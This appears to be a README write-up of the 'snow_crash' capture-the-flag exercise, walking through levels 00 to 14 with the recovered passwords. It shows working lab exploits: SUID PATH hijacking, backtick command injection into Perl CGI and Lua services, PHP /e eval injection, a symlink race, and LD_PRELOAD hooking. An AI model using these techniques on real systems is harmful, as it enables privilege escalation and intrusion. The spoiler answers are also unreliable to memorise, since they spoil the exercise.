# snow_crash

## Connection

Pour se connecter, il suffit de faire `ssh level00@192.168.1.30` (Note : Faire attention l'ip peut changer) password : `level00`

## Level 00

First one, we find the file of the user `flag00` is the owner.
After that we `cat` one of the file. 
```bash
level00@SnowCrash:~$ cat $(find / -user flag00 2> /dev/null)
```

We found this inside `cdiiddwpgswtgt`.
After multiple test we can translate this using [rot13](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,11)&input=Y2RpaWRkd3Bnc3d0Z3Q).
After this we found the answer is `nottoohardhere`.

After that we have to log with `flag00` and give the password `nottoohardhere`.
When we are connected we just have to use `getflag`.

When we got the flag we have to connect to the next level.

## Level 01
Look at the file we found in the previous level.
Yes the name of the file is **john**. Let use [John the ripper](https://fr.wikipedia.org/wiki/John_the_Ripper).

```bash
level01@SnowCrash:~$ cat /etc/passwd | grep flag01
```

Install [John](https://www.openwall.com/john/) on your computer and give it the result of the previous command.

After copy the file execute `john`. In my case i'm using [kali](https://www.kali.org/). 
```bash
kali@kali:~$ john --wordlist passwd
kali@kali:~$ john --show passwd
```
After the second command you should have this result.
```bash
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash
1 password hash cracked, 0 left
```

After that we have to log with `flag01` and give the password `abcdefg`.
When we are connected we just have to use `getflag`.

When we got the flag we have to connect to the next level.

## Level02

At the start of the level we can see a file `level02.pcap`.

```bash
level02@SnowCrash:~$ ls
level02.pcap
```

But what is a .pcap file? [Answer](https://www.solarwinds.com/resources/it-glossary/pcap).

Let's copy the file.
```bash
scp -P 4242 level02@192.168.1.30:~/level02.pcap ~/Desktop
```
*PS : [scp command](https://www.delafond.org/traducmanfr/man/man1/scp.1.html)*

But if you got the error `Permission denied`.
You just have to add right.
```bash
chmod 666 level02.pcap
```

Now we gonna used [tshark](https://www.wireshark.org/docs/man-pages/tshark.html)

After that we can use this command. Or you can use the software [Wireshark](https://www.wireshark.org/)

```bash
tshark -q -r level02.pcap -z follow,tcp,hex,0
```

```bash
000000B9  66                                                f
000000BA  74                                                t
000000BB  5f                                                _
000000BC  77                                                w
000000BD  61                                                a
000000BE  6e                                                n
000000BF  64                                                d
000000C0  72                                                r
000000C1  7f                                                .
000000C2  7f                                                .
000000C3  7f                                                .
000000C4  4e                                                N
000000C5  44                                                D
000000C6  52                                                R
000000C7  65                                                e
000000C8  6c                                                l
000000C9  7f                                                .
000000CA  4c                                                L
000000CB  30                                                0
000000CC  4c                                                L
000000CD  0d                                                .
===================================================================
```

When we look in `man ascii` the `7f` represent `DEL`.
After removing letter we have `ft_waNDReL0L`.

After that we have to log with `flag02` and give the password `ft_waNDReL0L`.
When we are connected we just have to use `getflag`.

When we got the flag we have to connect to the next level.

## Level03

At the start of the level we can see a file `level03`.

```bash
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$ ./level03
Exploit me
```

As we can see the file as a specific letter `s` in the permission. 
The `s` permission means [SUID](https://en.wikipedia.org/wiki/Setuid), the file is executed with the user owner's permission, the owner is flag03.

As we can see after running the binary the following message is `Exploit me`.

For that we gonna used [ltrace](https://man7.org/linux/man-pages/man1/ltrace.1.html)

```bash
level03@SnowCrash:~$ ltrace level03
Can't execute `level03': No such file or directory
PTRACE_SETOPTIONS: No such process
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7b4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                   = 2003
geteuid()                                                   = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)         = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)         = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                      = 0
+++ exited (status 0) +++
```

As we can see, there is a system call with `/usr/bin/env` of the echo file. We have to modify our PATH env to run the program.

```bash
level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo && chmod 755 /tmp/echo && export PATH=/tmp/:$PATH && ./level03
```
After that we have to log with `level04` and give the password `qi0maab88jeaj46qoumi7maus`.


## Level 04

We can see level04 a `level04.pl` file in our home directory.

```bash
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

When we `cat level04.pl` file, we can see a webserver running in localhost:4747 address.
We can confirm the server running with this command :
```bash
level04@SnowCrash:~$ netstat -tunl | grep 4747
tcp6       0      0 :::4747                 :::*                    LISTEN
```

As we can see the file content param `x`.
As the website run command, we can write the following command to get the flag. The pipe is added to execute the getflag command.
```bash
level04@SnowCrash:~$ curl '192.168.1.30:4747/?x=`getflag`'
```
After that we have to log with `level05` and give the password `ne2searoevaevoem4ov4ar8ap`.

## Level05

When we connect for the first time with the user `level05` we got this : 
```bash
level05@192.168.1.30's password:
You have new mail.
level05@SnowCrash:~$
```
To find the new mail you just have to check your env.
```bash
level05@SnowCrash:~$ env | grep MAIL
MAIL=/var/mail/level05
level05@SnowCrash:~$ ls -l $MAIL
-rw-r--r--+ 1 root mail 58 Jan 25 22:34 /var/mail/level05
level05@SnowCrash:~$ cat $MAIL
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

After looking on internet we see that openarenaserver is a game taking configuration file.

We just have to create a conf file and wait for execute.

Let's create a file `/opt/openarenaserver/exploit`
```vim
/bin/getflag > /tmp/soluce/flag05
```

After that we have to log with `level06` and give the password `viuaaale9huek52boumoomioc`.

## Level06

We can see the following in level06 home. There is a PHP file.

```bash
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
level06@SnowCrash:~$
```

How to exec a bin with php. [Doc](https://unix.stackexchange.com/questions/622412/arguments-limit-php-exec-to-bash-script)

```bash
level06@SnowCrash:~$ echo '[x {${exec(getflag)}}]' > $HOME/execFlag
level06@SnowCrash:~$ ./level06 $HOME/execFlag
```

After that we have to log with `level07` and give the password `wiok45aaoguiboiki2tuin6ub`.

## Level07

```bash
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

For this level we are gonna used [nm](https://linux.die.net/man/1/nm).
```bash
level07@SnowCrash:~$ nm -u level07
         w _Jv_RegisterClasses
         w __gmon_start__
         U __libc_start_main@@GLIBC_2.0
         U asprintf@@GLIBC_2.0
         U getegid@@GLIBC_2.0
         U getenv@@GLIBC_2.0
         U geteuid@@GLIBC_2.0
         U setresgid@@GLIBC_2.0
         U setresuid@@GLIBC_2.0
         U system@@GLIBC_2.0
evel07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7b4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                           = 2007
geteuid()                                                           = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                 = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                 = 0
getenv("LOGNAME")                                                   = "level07"
asprintf(0xbffff704, 0x8048688, 0xbfffff36, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                              = 0
+++ exited (status 0) +++
level07@SnowCrash:~
```

We can see the file used the env variable `LOGNAME`.

```bash
level07@SnowCrash:~$ export LOGNAME="; /bin/getflag"
level07@SnowCrash:~$ ./level07
```

After that we have to log with `level08` and give the password `fiumuikeil55xe9cu4dood66h`.

## Level08

When we are logging we can see :
```bash
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

After check the 2 file we can run this command :
```bash
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7b4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                            = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                        = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```
We can see the function [strstr](https://man7.org/linux/man-pages/man3/strstr.3.html) call.

```bash
ln -s /home/user/level08/token /tmp/pwd && ./level08 /tmp/pwd
```

After that we have to log with `flag08` and give the password `quif5eloekouj29ke0vouxean`.
When we are connected we just have to use `getflag`.

## Level 09

When we are logging we can see :
```bash
level09@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag09 level09 7640 Mar  5  2016 level09
----r--r-- 1 flag09 level09   26 Mar  5  2016 token
```

We copy the file on your own machine and we can see i get a param in enter.
```bash
scp -P 4242 level09@192.168.1.30:~/token ~/Desktop
chmod +r token
```

We deduce that the executable expects a string as an argument. For decoding it we jsut have to modif each charactere by incrementing index.

Example of code we can use :
```python
import sys

arg = sys.argv[1].encode(errors=\"surrogateescape\")

print(\"\".join([chr(l - i) for i, l in enumerate(arg) if l - i > 0]))
```

After that we have to log with `flag09` and give the password `s5cAJpM8ev6XHw998pRWG728z`.
When we are connected we just have to use `getflag`.
## Level10

```bash
level10@SnowCrash:~$ strings level10
	[...]
	%s file host
	sends file to host if you have access to it
  Connecting to %s:6969 ..
  Unable to connect to host %s
  .*( )*.
  Unable to write banner to host %s
  Connected!
  Sending file ..
  Damn. Unable to open file
  Unable to read from file: %s
  wrote file!
  You don't have access to %s
	[...]
```

After using `nm` we can find the function `access`.

```bash
level10@SnowCrash:~$ nm -u level10
         w _Jv_RegisterClasses
         U __errno_location@@GLIBC_2.0
         w __gmon_start__
         U __libc_start_main@@GLIBC_2.0
         U __stack_chk_fail@@GLIBC_2.4
         U access@@GLIBC_2.0
         U connect@@GLIBC_2.0
         U exit@@GLIBC_2.0
         U fflush@@GLIBC_2.0
         U htons@@GLIBC_2.0
         U inet_addr@@GLIBC_2.0
         U open@@GLIBC_2.0
         U printf@@GLIBC_2.0
         U puts@@GLIBC_2.0
         U read@@GLIBC_2.0
         U socket@@GLIBC_2.0
         U strerror@@GLIBC_2.0
         U write@@GLIBC_2.0
```
We gonna used a race condition exploit.

```bash
level10@SnowCrash:~$ while true; do ln -fs ~/level10 /tmp/exploit; ln -fs ~/token /tmp/exploit; done &
level10@SnowCrash:~$ while true; do ./level10 /tmp/exploit 192.168.1.30; done
# Open a second terminal
level10@SnowCrash:~$ nc -lk 6969
```

After a moment you can find this message `woupa2yuojeeaaed06riuj63c`.

After that we have to log with `flag10` and give the password `woupa2yuojeeaaed06riuj63c`.
When we are connected we just have to use `getflag`.

## Level 11

In this one, we have a [lua](https://fr.wikipedia.org/wiki/Lua) script.

```bash
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

We see that the script ensures it is run on port 5151.

```bash
level11@SnowCrash:~$ nc localhost 5151
Password: "; getflag > /tmp/answer"
Erf nope..
level11@SnowCrash:~$ cat /tmp/answer
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

After that we have to log with `level12` and give the password `fa6v5ateaw21peobuub8ipe6s`.

## Level 12

In this one, we have a [perl](https://fr.wikipedia.org/wiki/Perl_(langage)) script like the level 04.

```bash
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

```bash
level12@SnowCrash:~$ echo "getflag > /tmp/answer" > /tmp/TEST && chmod +x /tmp/TEST
level12@SnowCrash:~$ curl 'http://127.0.0.1:4646/?x=`/*/test`'
level12@SnowCrash:~$ cat /tmp/answer
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
When you cat the file we can see some regex.

After that we have to log with `level13` and give the password `g1qKMiRpXf53AWhDaU7FEkczr`.

## Level 13

In this level we can found a binary. If we `ltrace` the program we can see he call getuid. The program expect 4242.

```bash
level13@SnowCrash:~$ ls -l
total 8
-rwsr-sr-x 1 flag13 level13 7303 Aug 30  2015 level13
```
```bash
level13@SnowCrash:~$ ltrace ./level13
__libc_start_main(0x804858c, 1, 0xbffff7b4, 0x80485f0, 0x8048660 <unfinished ...>
getuid()                                                        = 2013
getuid()                                                        = 2013
printf("UID %d started us but we we expe"..., 2013UID 2013 started us but we we expect 4242
)             = 42
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

For this one we create a program that change the comportement of `getuid` for return 4242. 

```c
#include <sys/types.h>

uid_t getuid(void) {
	return 4242;
}
```
```
level13@SnowCrash:~$ cd /tmp
level13@SnowCrash:/tmp$ gcc /tmp/getuid.c -shared -o getuid.so
level13@SnowCrash:/tmp$ export LD_PRELOAD=/tmp/getuid.so
```


After modify the env `LD_PRELOAD` we can recheck `ltrace` :
```bash
level13@SnowCrash:~$ ltrace ./level13
__libc_start_main(0x804858c, 1, 0xbffff7a4, 0x80485f0, 0x8048660 <unfinished ...>
getuid()                                                        = 4242
strdup("boe]!ai0FB@.:|L6l@A?>qJ}I")                             = 0x0804b008
printf("your token is %s\n", "2A31L79asukciNyi8uppkEuSx"your token is 2A31L79asukciNyi8uppkEuSx
)       = 40
+++ exited (status 40) +++
```
As we can see the fonction `getuid` return 4242.

```bash
level13@SnowCrash:~$ ./level13
2A31L79asukciNyi8uppkEuSx
```
After that we have to log with `level14` and give the password `2A31L79asukciNyi8uppkEuSx`.


## Level14:
We gonna reverseingenering the binary `getflag`.
For that we can use [DogBolt](https://dogbolt.org/).

AFter that we can recreate `ft_des` :

```c
#include <stdio.h>   // Inclure pour printf
#include <string.h>  // Inclure pour strdup
#include <stdlib.h> 

char * ft_des(char *param_1)
{
  char cVar1;
  char *pcVar2;
  unsigned int uVar3;
  char *pcVar4;
  unsigned char bVar5;
  unsigned int local_20;
  int local_1c;
  int local_18;
  int local_14;
  
  bVar5 = 0;
  pcVar2 = strdup(param_1);
  local_1c = 0;
  local_20 = 0;
  do {
    uVar3 = 0xffffffff;
    pcVar4 = pcVar2;
    do {
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      cVar1 = *pcVar4;
      pcVar4 = pcVar4 + (uint)bVar5 * -2 + 1;
    } while (cVar1 != '\0');
    if (~uVar3 - 1 <= local_20) {
      return pcVar2;
    }
    if (local_1c == 6) {
      local_1c = 0;
    }
    if ((local_20 & 1) == 0) {
      if ((local_20 & 1) == 0) {
        for (local_14 = 0; local_14 < "0123456"[local_1c]; local_14 = local_14 + 1) {
          pcVar2[local_20] = pcVar2[local_20] + -1;
          if (pcVar2[local_20] == '\x1f') {
            pcVar2[local_20] = '~';
          }
        }
      }
    }
    else {
      for (local_18 = 0; local_18 < "0123456"[local_1c]; local_18 = local_18 + 1) {
        pcVar2[local_20] = pcVar2[local_20] + '\x01';
        if (pcVar2[local_20] == '\x7f') {
          pcVar2[local_20] = ' ';
        }
      }
    }
    local_20 = local_20 + 1;
    local_1c = local_1c + 1;
  } while( 1);
}

int main() {

	char *res = (ft_des("g <t61:|4_|!@IF.-62FH&G~DCK/Ekrvvdwz?v|"));

	printf("%s\n", res);
}
```

Thank you [@vportens](https://github.com/https://github.com/vportens) for this part.

## 🙇 Author
#### Florian Catinaud
- Github: [@balgor18](https://github.com/balgor18)
#### Victor Portenseigne
- Github: [@vportens](https://github.com/https://github.com/vportens)
